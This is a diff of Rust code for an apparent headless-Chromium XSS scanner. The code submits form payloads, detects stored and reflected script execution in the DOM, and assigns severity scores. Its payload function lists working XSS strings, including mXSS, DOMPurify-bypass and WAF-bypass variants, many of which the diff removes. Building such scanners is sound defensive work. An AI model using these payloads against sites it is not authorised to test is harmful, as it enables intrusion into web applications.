+                                const el = document.querySelector("{}");
+                                if (el) {{
+                                    el.value = {};
+                                }}
+                            }})()"#,
+                            escaped_selector,
+                            escaped_payload
+                        );
+                        let _ = tab.evaluate(&fill_js, false);
                     }
                 }
+            }
 
-                // Log what we're about to submit
-                info!("[Chromium-XSS] Submitting form {} with payload: {}...", form_idx, &payload[..std::cmp::min(50, payload.len())]);
+            info!("[Chromium-XSS] Submitting form {}", form_idx);
 
-                // Submit form
-                let submit_js = format!(
-                    r#"(function() {{
-                        const form = document.querySelectorAll('form')[{}];
-                        if (form) {{
-                            const btn = form.querySelector('[type="submit"], button:not([type="button"])');
-                            if (btn) btn.click(); else form.submit();
+            let submit_js = format!(
+                r#"(function() {{
+                    const form = document.querySelectorAll('form')[{}];
+                    if (form) {{
+                        const btn = form.querySelector('[type="submit"], button:not([type="button"])');
+                        if (btn) btn.click(); else form.submit();
+                    }}
+                }})()"#,
+                form_idx
+            );
+            let _ = tab.evaluate(&submit_js, false);
+
+            Self::poll_for_xss_or_stability(&tab, 800, 100);
+
+            let _ = tab.evaluate(
+                &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
+                false
+            );
+
+            let input_names: Vec<String> = inputs.iter()
+                .filter_map(|i| i.get("name").and_then(|v| v.as_str()).map(|s| s.to_string()))
+                .collect();
+            let input_names_str = input_names.join(", ");
+
+            if let Some(mut result) = Self::check_xss_triggered(&tab, url, &stored_payload)? {
+                if result.xss_triggered {
+                    info!("[Chromium-XSS] CONFIRMED stored XSS via form!");
+                    result.parameter = Some(input_names_str.clone());
+                    result.injection_point = Some("Hook interception".to_string());
+                    results.push(result);
+                    return Ok(results);
+                }
+            }
+
+            let dom_check_js = format!(r#"
+                (function() {{
+                    const marker = '{}';
+                    let xssFound = false;
+                    let location = 'none';
+                    let severity = 'NONE';
+
+                    document.querySelectorAll('script').forEach(script => {{
+                        const content = script.textContent || script.src || '';
+                        if (content.includes(marker)) {{
+                            xssFound = true;
+                            location = 'SCRIPT tag';
+                            severity = 'CRITICAL';
                         }}
-                    }})()"#,
-                    form_idx
-                );
-                let _ = tab.evaluate(&submit_js, false);
+                    }});
 
-                // Wait for submission and page render
-                std::thread::sleep(Duration::from_millis(2000));
-
-                // Reset marker after form submit (page may have reloaded)
-                let _ = tab.evaluate(
-                    &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
-                    false
-                );
-
-                // Get input field names for evidence (needed for all detection paths)
-                let input_names: Vec<String> = inputs.iter()
-                    .filter_map(|i| i.get("name").and_then(|v| v.as_str()).map(|s| s.to_string()))
-                    .collect();
-                let input_names_str = input_names.join(", ");
-
-                // Check if XSS triggered immediately (same-page render via hooks)
-                if let Some(mut result) = Self::check_xss_triggered(&tab, url, payload)? {
-                    if result.xss_triggered {
-                        info!("[Chromium-XSS] CONFIRMED stored XSS via form (hook detected)!");
-                        result.parameter = Some(input_names_str.clone());
-                        result.injection_point = Some("Hook interception".to_string());
-                        results.push(result);
-                        return Ok(results);
-                    }
-                }
-
-                // CRITICAL: Check if marker appears in EXECUTABLE context (not just text reflection)
-                // Text in <div>MARKER</div> is NOT XSS - it's safely encoded
-                // Only script tags, event handlers, javascript: URLs are real XSS
-
-                let dom_check_js = format!(r#"
-                    (function() {{
-                        const marker = '{}';
-                        let xssFound = false;
-                        let location = 'none';
-                        let severity = 'NONE';
-
-                        // 1. Check for marker in <script> tags (CRITICAL - real execution)
-                        document.querySelectorAll('script').forEach(script => {{
-                            const content = script.textContent || script.src || '';
-                            if (content.includes(marker)) {{
-                                xssFound = true;
-                                location = 'SCRIPT tag';
-                                severity = 'CRITICAL';
+                    if (!xssFound) {{
+                        const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus',
+                                                'onblur', 'onkeydown', 'onkeyup', 'onsubmit', 'onchange',
+                                                'oninput', 'onmouseenter', 'ontoggle', 'onstart'];
+                        document.querySelectorAll('*').forEach(el => {{
+                            for (const attr of dangerousAttrs) {{
+                                const val = el.getAttribute(attr);
+                                if (val && val.includes(marker)) {{
+                                    xssFound = true;
+                                    location = el.tagName + '[' + attr + ']';
+                                    severity = 'HIGH';
+                                    return;
+                                }}
                             }}
                         }});
+                    }}
 
-                        // 2. Check for marker in event handler attributes (onclick, onerror, etc.)
-                        if (!xssFound) {{
-                            const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus',
-                                                    'onblur', 'onkeydown', 'onkeyup', 'onsubmit', 'onchange',
-                                                    'oninput', 'onmouseenter', 'ontoggle', 'onstart'];
-                            document.querySelectorAll('*').forEach(el => {{
-                                for (const attr of dangerousAttrs) {{
-                                    const val = el.getAttribute(attr);
-                                    if (val && val.includes(marker)) {{
-                                        xssFound = true;
-                                        location = el.tagName + '[' + attr + ']';
-                                        severity = 'HIGH';
-                                        return;
-                                    }}
-                                }}
-                            }});
-                        }}
-
-                        // 3. Check for marker in javascript: URLs (href, src, action)
-                        if (!xssFound) {{
-                            document.querySelectorAll('[href], [src], [action]').forEach(el => {{
-                                ['href', 'src', 'action'].forEach(attr => {{
-                                    const val = el.getAttribute(attr);
-                                    if (val && val.toLowerCase().startsWith('javascript:') && val.includes(marker)) {{
-                                        xssFound = true;
-                                        location = el.tagName + '[' + attr + '=javascript:]';
-                                        severity = 'HIGH';
-                                    }}
-                                }});
-                            }});
-                        }}
-
-                        // 4. Check for marker in iframe srcdoc (executes HTML)
-                        if (!xssFound) {{
-                            document.querySelectorAll('iframe[srcdoc]').forEach(iframe => {{
-                                const srcdoc = iframe.getAttribute('srcdoc') || '';
-                                if (srcdoc.includes(marker)) {{
+                    if (!xssFound) {{
+                        document.querySelectorAll('[href], [src], [action]').forEach(el => {{
+                            ['href', 'src', 'action'].forEach(attr => {{
+                                const val = el.getAttribute(attr);
+                                if (val && val.toLowerCase().startsWith('javascript:') && val.includes(marker)) {{
                                     xssFound = true;
-                                    location = 'IFRAME[srcdoc]';
+                                    location = el.tagName + '[' + attr + '=javascript:]';
                                     severity = 'HIGH';
                                 }}
                             }});
-                        }}
+                        }});
+                    }}
 
-                        // 5. Check for marker in SVG with script or event handlers
-                        if (!xssFound) {{
-                            document.querySelectorAll('svg').forEach(svg => {{
-                                const inner = svg.innerHTML || '';
-                                if (inner.includes(marker) && (inner.includes('<script') || inner.includes('on'))) {{
-                                    xssFound = true;
-                                    location = 'SVG (script/event)';
-                                    severity = 'HIGH';
-                                }}
-                            }});
-                        }}
+                    if (!xssFound) {{
+                        document.querySelectorAll('iframe[srcdoc]').forEach(iframe => {{
+                            const srcdoc = iframe.getAttribute('srcdoc') || '';
+                            if (srcdoc.includes(marker)) {{
+                                xssFound = true;
+                                location = 'IFRAME[srcdoc]';
+                                severity = 'HIGH';
+                            }}
+                        }});
+                    }}
 
-                        // NOTE: We deliberately DO NOT flag text-only reflections like:
-                        // <div>MARKER</div> or <span>user input: MARKER</span>
-                        // These are safely HTML-encoded and do NOT execute JavaScript
+                    if (xssFound) {{
+                        window.__xssTriggered = true;
+                        window.__xssTriggerType = 'dom-executable';
+                        window.__xssMessage = 'Executable XSS found in: ' + location;
+                        window.__xssSeverity = severity;
+                        return location;
+                    }}
+                    return false;
+                }})()
+            "#, marker);
 
-                        if (xssFound) {{
-                            window.__xssTriggered = true;
-                            window.__xssTriggerType = 'dom-executable';
-                            window.__xssMessage = 'Executable XSS found in: ' + location;
-                            window.__xssSeverity = severity;
-                            return location;
-                        }}
-                        return false;
-                    }})()
-                "#, marker);
-                if let Ok(dom_result) = tab.evaluate(&dom_check_js, false) {
-                    let location = dom_result.value.and_then(|v| v.as_str().map(|s| s.to_string()));
-                    if location.is_some() && location.as_ref().map(|s| s != "false").unwrap_or(false) {
-                        let loc_str = location.clone().unwrap_or_else(|| "DOM".to_string());
-                        info!("[Chromium-XSS] CONFIRMED stored XSS - marker found in DOM at: {}", loc_str);
-                        if let Some(mut result) = Self::check_xss_triggered(&tab, url, payload)? {
-                            // Set the parameter and injection point for the report
-                            result.parameter = Some(input_names_str.clone());
-                            result.injection_point = Some(loc_str.clone());
-                            result.dialog_message = Some(format!(
-                                "Stored via form #{} fields [{}]. Found at: {}",
-                                form_idx,
-                                input_names_str,
-                                loc_str
-                            ));
-                            results.push(result);
-                            return Ok(results);
-                        }
-                    }
-                }
-
-                // CRITICAL: Capture recorded requests BEFORE reload
-                let requests_js = "JSON.stringify(window.__xssRequests || [])";
-                let recorded_requests: Vec<serde_json::Value> = if let Ok(req_result) = tab.evaluate(requests_js, false) {
-                    if let Some(value) = req_result.value {
-                        if let Some(json_str) = value.as_str() {
-                            serde_json::from_str(json_str).unwrap_or_default()
-                        } else { Vec::new() }
-                    } else { Vec::new() }
-                } else { Vec::new() };
-
-                info!("[Chromium-XSS] Captured {} requests, setting up bootstrap replay...", recorded_requests.len());
-
-                // Create a NEW tab with fresh interceptor for bootstrap replay
-                let replay_tab = browser.new_tab_with_interceptor(&marker)?;
-                replay_tab.set_default_timeout(Duration::from_secs(15));
-
-                // CRITICAL: Inject fetch override BEFORE navigation to replay during bootstrap
-                // This intercepts fetch calls during page load and ensures stored data triggers render
-                let replay_urls: Vec<String> = recorded_requests.iter()
-                    .filter_map(|r| r.get("url").and_then(|v| v.as_str()))
-                    .filter(|u| u.contains("comment") || u.contains("api") || u.contains("data") || u.contains("load"))
-                    .map(|s| s.to_string())
-                    .collect();
-
-                if !replay_urls.is_empty() {
-                    let replay_setup_js = format!(r#"
-                        (function() {{
-                            window.__replayUrls = {};
-                            window.__replayDone = false;
-
-                            const origFetch = window.fetch;
-                            window.fetch = async function(...args) {{
-                                const [url] = args;
-                                const urlStr = String(url);
-
-                                // During bootstrap, ensure we hit the real endpoint (which now has stored payload)
-                                console.log('[XSS-REPLAY] Fetch intercepted during bootstrap:', urlStr);
-
-                                const res = await origFetch.apply(this, args);
-
-                                // Check response for our marker
-                                try {{
-                                    const clone = res.clone();
-                                    const text = await clone.text();
-                                    if (text.includes(window.__xssMarker)) {{
-                                        console.log('[XSS-REPLAY] MARKER FOUND IN RESPONSE!');
-                                        window.__xssTriggered = true;
-                                        window.__xssTriggerType = 'fetch-response-bootstrap';
-                                        window.__xssMessage = text.substring(0, 300);
-                                    }}
-                                }} catch(e) {{}}
-
-                                return res;
-                            }};
-                        }})();
-                    "#, serde_json::to_string(&replay_urls).unwrap_or("[]".to_string()));
-
-                    let _ = replay_tab.evaluate(&replay_setup_js, false);
-                }
-
-                // NOW navigate - fetch override is in place for bootstrap
-                info!("[Chromium-XSS] Navigating with bootstrap replay active...");
-                let _ = replay_tab.navigate_to(url);
-                std::thread::sleep(Duration::from_millis(3000)); // Longer wait for full bootstrap
-
-                // Check if XSS triggered during bootstrap render
-                if let Some(mut result) = Self::check_xss_triggered(&replay_tab, url, payload)? {
-                    if result.xss_triggered {
-                        info!("[Chromium-XSS] CONFIRMED stored XSS during bootstrap render!");
+            if let Ok(dom_result) = tab.evaluate(&dom_check_js, false) {
+                let location = dom_result.value.and_then(|v| v.as_str().map(|s| s.to_string()));
+                if location.is_some() && location.as_ref().map(|s| s != "false").unwrap_or(false) {
+                    let loc_str = location.clone().unwrap_or_else(|| "DOM".to_string());
+                    info!("[Chromium-XSS] CONFIRMED stored XSS at: {}", loc_str);
+                    if let Some(mut result) = Self::check_xss_triggered(&tab, url, &stored_payload)? {
                         result.parameter = Some(input_names_str.clone());
-                        result.injection_point = Some("Bootstrap render".to_string());
+                        result.injection_point = Some(loc_str.clone());
+                        result.dialog_message = Some(format!(
+                            "Stored via form #{} fields [{}]. Found at: {}",
+                            form_idx,
+                            input_names_str,
+                            loc_str
+                        ));
                         results.push(result);
                         return Ok(results);
                     }
                 }
-
-                // Also try forcing render after bootstrap (for lazy-loaded content)
-                let _ = replay_tab.evaluate(r#"
-                    (function() {
-                        // Force re-render by triggering common events
-                        document.dispatchEvent(new Event('visibilitychange'));
-                        window.dispatchEvent(new Event('focus'));
-                        window.dispatchEvent(new Event('hashchange'));
-
-                        // Try common SPA render hooks
-                        if (window.renderComments) try { window.renderComments(); } catch(e) {}
-                        if (window.loadComments) try { window.loadComments(); } catch(e) {}
-                        if (window.refreshComments) try { window.refreshComments(); } catch(e) {}
-                        if (window.loadData) try { window.loadData(); } catch(e) {}
-                        if (window.refresh) try { window.refresh(); } catch(e) {}
-
-                        // Click refresh/load buttons
-                        document.querySelectorAll('[class*="refresh"], [class*="reload"], [class*="load"], [onclick*="load"]').forEach(el => {
-                            try { el.click(); } catch(e) {}
-                        });
-
-                        // Trigger any pending promises
-                        setTimeout(() => {
-                            document.querySelectorAll('[data-load], [data-fetch]').forEach(el => {
-                                try { el.dispatchEvent(new Event('load')); } catch(e) {}
-                            });
-                        }, 100);
-                    })();
-                "#, false);
-                std::thread::sleep(Duration::from_millis(1500));
-
-                // Final check after forced render
-                if let Some(mut result) = Self::check_xss_triggered(&replay_tab, url, payload)? {
-                    if result.xss_triggered {
-                        info!("[Chromium-XSS] CONFIRMED stored XSS after forced render!");
-                        result.parameter = Some(input_names_str.clone());
-                        result.injection_point = Some("Forced render".to_string());
-                        results.push(result);
-                        return Ok(results);
-                    }
-                }
-
-                // Also check potential render endpoints (common API patterns)
-                let render_endpoints = vec![
-                    format!("{}/comments", url.split('?').next().unwrap_or(url)),
-                    format!("{}?action=view", url.split('?').next().unwrap_or(url)),
-                    url.replace("admin", "view"),
-                ];
-
-                for endpoint in render_endpoints.iter().take(2) {
-                    if endpoint != url {
-                        let _ = tab.evaluate(
-                            &format!("window.__xssMarker = '{}'; window.__xssTriggered = false;", marker),
-                            false
-                        );
-                        if tab.navigate_to(endpoint).is_ok() {
-                            std::thread::sleep(Duration::from_millis(1500));
-                            if let Some(mut result) = Self::check_xss_triggered(&tab, endpoint, payload)? {
-                                if result.xss_triggered {
-                                    info!("[Chromium-XSS] CONFIRMED stored XSS at render endpoint: {}", endpoint);
-                                    result.parameter = Some(input_names_str.clone());
-                                    result.injection_point = Some(format!("Render endpoint: {}", endpoint));
-                                    results.push(result);
-                                    return Ok(results);
-                                }
-                            }
-                        }
-                    }
-                }
-
-                // Navigate back for next payload
-                let _ = tab.navigate_to(url);
-                std::thread::sleep(Duration::from_millis(800));
-
-                // Reset marker after SPA navigation (SPAs may overwrite globals)
-                let _ = tab.evaluate(
-                    &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
-                    false
-                );
             }
+
+            let _ = tab.navigate_to(url);
+            Self::poll_for_xss_or_stability(&tab, 300, 100);
+
+            let _ = tab.evaluate(
+                &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
+                false
+            );
         }
 
         Ok(results)
     }
 
-    /// Poll for XSS trigger or DOM stability with exponential backoff
-    /// Returns early if XSS is detected, otherwise waits for DOM to stabilize
-    /// This replaces fixed sleeps with adaptive waiting for async SPAs
     fn poll_for_xss_or_stability(tab: &Tab, max_wait_ms: u64, poll_interval_ms: u64) -> bool {
         let start = std::time::Instant::now();
-        let mut last_dom_hash: Option<String> = None;
         let mut stable_count = 0;
 
         while start.elapsed().as_millis() < max_wait_ms as u128 {
-            // Check if XSS already triggered - early exit
-            let xss_check = r#"window.__xssTriggered || false"#;
-            if let Ok(result) = tab.evaluate(xss_check, false) {
-                if let Some(triggered) = result.value.and_then(|v| v.as_bool()) {
-                    if triggered {
-                        debug!("[Chromium-XSS] XSS detected during polling, returning early");
-                        return true;
-                    }
+            if let Ok(result) = tab.evaluate("window.__xssTriggered || false", false) {
+                if result.value.and_then(|v| v.as_bool()).unwrap_or(false) {
+                    return true;
                 }
             }
 
-            // Check DOM stability by hashing key elements
-            let dom_hash_js = r#"
-                (function() {
-                    // Hash key DOM metrics to detect render completion
-                    const body = document.body;
-                    if (!body) return 'no-body';
-                    const scripts = document.scripts.length;
-                    const elemCount = document.querySelectorAll('*').length;
-                    const pendingFetches = window.__xssRequests ? window.__xssRequests.length : 0;
-                    return scripts + '|' + elemCount + '|' + pendingFetches;
-                })()
-            "#;
-
-            if let Ok(result) = tab.evaluate(dom_hash_js, false) {
-                if let Some(hash) = result.value.and_then(|v| v.as_str().map(|s| s.to_string())) {
-                    if last_dom_hash.as_ref() == Some(&hash) {
-                        stable_count += 1;
-                        if stable_count >= 2 {
-                            // DOM has been stable for 2 poll intervals - render complete
-                            debug!("[Chromium-XSS] DOM stable after {}ms", start.elapsed().as_millis());
-                            return false;
-                        }
-                    } else {
-                        stable_count = 0;
-                        last_dom_hash = Some(hash);
+            let ready_js = r#"document.readyState === 'complete' ? 'ready' : 'loading'"#;
+            if let Ok(result) = tab.evaluate(ready_js, false) {
+                let is_ready = result.value
+                    .as_ref()
+                    .and_then(|v| v.as_str())
+                    .map(|s| s == "ready")
+                    .unwrap_or(false);
+                if is_ready {
+                    stable_count += 1;
+                    if stable_count >= 2 {
+                        return false;
                     }
+                } else {
+                    stable_count = 0;
                 }
             }
 
             std::thread::sleep(Duration::from_millis(poll_interval_ms));
         }
-
-        debug!("[Chromium-XSS] Max wait reached ({}ms)", max_wait_ms);
         false
     }
 
-    /// Test a single URL and check for XSS execution
     fn test_single_url(
         browser: &SharedBrowser,
         url: &str,
         marker: &str,
     ) -> Result<XssDetectionResult> {
         let tab = browser.new_tab_with_interceptor(marker)?;
+        tab.set_default_timeout(Duration::from_secs(6));
 
-        // Set navigation timeout - shorter to avoid blocking
-        tab.set_default_timeout(Duration::from_secs(8));
-
-        // Navigate to test URL with timeout handling
-        // Use navigate_to which returns immediately, then wait for network idle
         if let Err(e) = tab.navigate_to(url) {
             debug!("[Chromium-XSS] Navigation failed for {}: {}", url, e);
             return Ok(XssDetectionResult {
@@ -1595,53 +1037,37 @@ impl ChromiumXssScanner {
             });
         }
 
-        // Wait for page load - use wait_until_navigated with timeout
-        // If this fails, we still check XSS since interceptor might have caught it
         let _ = tab.wait_until_navigated();
 
-        // Poll for XSS or DOM stability instead of fixed sleep
-        // This handles async SPAs that render on different timings
-        if Self::poll_for_xss_or_stability(&tab, 800, 100) {
-            // XSS already triggered during initial render
+        if Self::poll_for_xss_or_stability(&tab, 500, 100) {
             return Self::check_xss_triggered(&tab, url, url)?
                 .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"));
         }
 
-        // Reset marker after navigation (SPAs may overwrite globals during hydration)
         let _ = tab.evaluate(
             &format!("window.__xssMarker='{}'; if(!window.__xssTriggered) window.__xssTriggerType='none';", marker),
             false
         );
 
-        // Simulate events to trigger event-handler XSS (click, focus, mouseover)
         let _ = tab.evaluate(r#"
             (function() {
-                // Trigger focus on inputs (for onfocus handlers)
                 document.querySelectorAll('input, textarea').forEach(el => {
                     try { el.focus(); el.blur(); } catch(e) {}
                 });
-                // Trigger mouseover on interactive elements
                 document.querySelectorAll('a, button, [onclick], [onmouseover]').forEach(el => {
                     try {
                         el.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
-                        el.dispatchEvent(new MouseEvent('mouseenter', {bubbles: true}));
                     } catch(e) {}
                 });
-                // Click autofocus elements
-                const autofocus = document.querySelector('[autofocus]');
-                if (autofocus) try { autofocus.click(); } catch(e) {}
             })();
         "#, false);
 
-        // Poll again after triggering events - some handlers may trigger async
-        Self::poll_for_xss_or_stability(&tab, 500, 100);
+        Self::poll_for_xss_or_stability(&tab, 300, 100);
 
-        // Check if XSS was triggered
         Self::check_xss_triggered(&tab, url, url)?
             .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"))
     }
 
-    /// Check if XSS was triggered in the current tab
     fn check_xss_triggered(
         tab: &Tab,
         url: &str,
@@ -1686,13 +1112,12 @@ impl ChromiumXssScanner {
                         "document.write" | "document.writeln" => XssTriggerType::DocumentWrite,
                         "location.assign" | "location.replace" => XssTriggerType::LocationChange,
                         "fetch-url" | "img.src" => XssTriggerType::DataExfil,
-                        "fetch-response" | "fetch-response-bootstrap" | "xhr-response" => XssTriggerType::InnerHtml, // Response contains XSS
-                        // NOTE: textContent/innerText removed - they are NOT XSS sinks (always HTML-encode)
+                        "fetch-response" | "xhr-response" => XssTriggerType::InnerHtml,
                         s if s.contains("shadow") => XssTriggerType::ShadowDom,
-                        s if s.starts_with("dom-") => XssTriggerType::DomExecution, // dom-html, dom-event-attribute, etc
-                        s if s.starts_with("js-") => XssTriggerType::Eval,          // js-eval, js-function
+                        s if s.starts_with("dom-") => XssTriggerType::DomExecution,
+                        s if s.starts_with("js-") => XssTriggerType::Eval,
                         s if s.contains("DOM") => XssTriggerType::DomExecution,
-                        _ => XssTriggerType::DomExecution, // Default to DOM execution instead of None - if triggered, it's XSS
+                        _ => XssTriggerType::DomExecution,
                     };
 
                     let severity = match severity_str {
@@ -1723,7 +1148,6 @@ impl ChromiumXssScanner {
         Ok(None)
     }
 
-    /// Create vulnerability from detection result
     fn create_vulnerability(&self, result: &XssDetectionResult) -> Result<Vulnerability> {
         let trigger_desc = match result.trigger_type {
             XssTriggerType::AlertDialog => "JavaScript alert() executed",
@@ -1747,16 +1171,14 @@ impl ChromiumXssScanner {
             "Reflected XSS"
         };
 
-        // Map XssSeverity to Severity and CVSS
         let (severity, cvss) = match result.severity {
             XssSeverity::Critical => (Severity::Critical, 9.6),
             XssSeverity::High => (Severity::High, 8.2),
             XssSeverity::Medium => (Severity::Medium, 6.5),
             XssSeverity::Low => (Severity::Low, 4.3),
-            XssSeverity::Unknown => (Severity::High, 7.5), // Default for unknown
+            XssSeverity::Unknown => (Severity::High, 7.5),
         };
 
-        // Build detailed evidence with all available info
         let mut evidence_parts = vec![
             format!("Trigger: {}", trigger_desc),
             format!("Severity: {:?}", result.severity),
@@ -1810,10 +1232,8 @@ impl ChromiumXssScanner {
         })
     }
 
-    /// Get XSS payloads based on scan mode
     fn get_xss_payloads(mode: &ScanMode) -> Vec<String> {
         let base = vec![
-            "<script>alert('MARKER')</script>".to_string(),
             "<img src=x onerror=alert('MARKER')>".to_string(),
             "<svg onload=alert('MARKER')>".to_string(),
             "'\"><script>alert('MARKER')</script>".to_string(),
@@ -1823,69 +1243,23 @@ impl ChromiumXssScanner {
         let advanced = vec![
             "<details open ontoggle=alert('MARKER')>".to_string(),
             "<input onfocus=alert('MARKER') autofocus>".to_string(),
-            "<marquee onstart=alert('MARKER')>".to_string(),
             "<script>alert`MARKER`</script>".to_string(),
-            // Template literal bypass
-            "<script>alert`MARKER`</script>".to_string(),
-            // Event handlers with encoding bypass
-            "<img src=x onerror=\"alert('MARKER')\">".to_string(),
-            "<svg/onload=alert('MARKER')>".to_string(),
         ];
 
-        // mXSS payloads - exploit browser HTML parser mutations
-        // These look safe but get mutated into executable XSS by the browser
         let mxss = vec![
-            // Classic mXSS via backtick in attribute (Chrome/Firefox)
             "<img src=\"`><script>alert('MARKER')</script>\">".to_string(),
-            // mXSS via noscript parsing differential
             "<noscript><p title=\"</noscript><script>alert('MARKER')</script>\">".to_string(),
-            // mXSS via style parsing in SVG foreignObject
-            "<svg><foreignObject><style><![CDATA[</style><script>alert('MARKER')</script>]]></style></foreignObject></svg>".to_string(),
-            // mXSS via table parsing quirks
-            "<table><tr><td><style></td><script>alert('MARKER')</script></style></tr></table>".to_string(),
-            // mXSS via form parsing
             "<form><button formaction=\"javascript:alert('MARKER')\">".to_string(),
-            // mXSS via math/SVG namespace confusion
-            "<math><mtext><table><mglyph><style><img src=x onerror=alert('MARKER')>".to_string(),
-            // mXSS via annotation-xml
-            "<math><annotation-xml encoding=\"text/html\"><script>alert('MARKER')</script></annotation-xml></math>".to_string(),
-            // DOMPurify bypass attempts (historical)
-            "<svg></p><style><g title=\"</style><img src=x onerror=alert('MARKER')>\">".to_string(),
         ];
 
-        // WAF bypass payloads
         let waf_bypass = vec![
-            // Case variations
             "<ScRiPt>alert('MARKER')</sCrIpT>".to_string(),
-            "<IMG SRC=x ONERROR=alert('MARKER')>".to_string(),
-            // Unicode/encoding bypasses
-            "<script>alert\u{FF08}'MARKER'\u{FF09}</script>".to_string(), // Fullwidth parentheses
-            // Null byte injection
-            "<scr\x00ipt>alert('MARKER')</script>".to_string(),
-            // HTML entity encoding
             "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('MARKER')>".to_string(),
-            // Double encoding
-            "<img src=x onerror=\"&#x61;lert('MARKER')\">".to_string(),
-            // Newline/tab bypasses
-            "<img src=x one\nrror=alert('MARKER')>".to_string(),
-            "<img src=x one\trror=alert('MARKER')>".to_string(),
-            // Protocol handler bypasses
-            "<a href=\"&#106;avascript:alert('MARKER')\">click</a>".to_string(),
-            "<a href=\"java\tscript:alert('MARKER')\">click</a>".to_string(),
-            // SVG-specific bypasses
-            "<svg><animate onbegin=alert('MARKER') attributeName=x dur=1s>".to_string(),
-            "<svg><set onbegin=alert('MARKER') attributename=x to=y>".to_string(),
-            // iframe srcdoc (often missed by WAFs)
             "<iframe srcdoc=\"<script>alert('MARKER')</script>\">".to_string(),
-            // Object/embed bypasses
-            "<object data=\"javascript:alert('MARKER')\">".to_string(),
-            // Template injection context
-            "{{constructor.constructor('alert(\"MARKER\")')()}}".to_string(),
-            "${alert('MARKER')}".to_string(),
         ];
 
         match mode {
-            ScanMode::Fast => base[..3].to_vec(),
+            ScanMode::Fast => base[..2].to_vec(),
             ScanMode::Normal => base,
             ScanMode::Thorough => {
                 let mut all = base;
@@ -1894,7 +1268,6 @@ impl ChromiumXssScanner {
                 all
             }
             _ => {
-                // Insane mode - all payloads
                 let mut all = base;
                 all.extend(advanced);
                 all.extend(mxss);
